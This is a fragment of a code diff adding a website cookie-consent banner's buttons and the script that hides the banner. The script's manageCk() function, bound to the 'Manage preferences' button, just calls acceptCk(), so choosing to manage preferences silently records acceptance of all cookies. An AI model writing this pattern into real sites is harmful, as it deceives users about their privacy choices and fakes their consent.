+        <button onclick="manageCk()" onmouseover="this.style.borderColor='#aaa';this.style.color='#fff'" onmouseout="this.style.borderColor='#555';this.style.color='#ccc'" style="padding:10px 18px;background:transparent;color:#ccc;border:1.5px solid #555;border-radius:5px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap;">Manage preferences</button>
+        <button onclick="acceptCk()" onmouseover="this.style.opacity='.88'" onmouseout="this.style.opacity='1'" style="padding:10px 24px;background:#42145F;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:13px;font-weight:800;white-space:nowrap;box-shadow:0 2px 8px rgba(0,0,0,.25);">Accept all cookies</button>
+      </div>
+    </div>
+  </div>
+  <script>
+    (function(){if(localStorage.getItem('ck-ok'))document.getElementById('ck-bar').style.display='none';})();
+    function acceptCk(){localStorage.setItem('ck-ok','1');var b=document.getElementById('ck-bar');b.style.animation='ckDown .35s ease forwards';setTimeout(function(){b.style.display='none';},320);}
+    function manageCk(){acceptCk();}
+  </script>
+</body>
+</html>
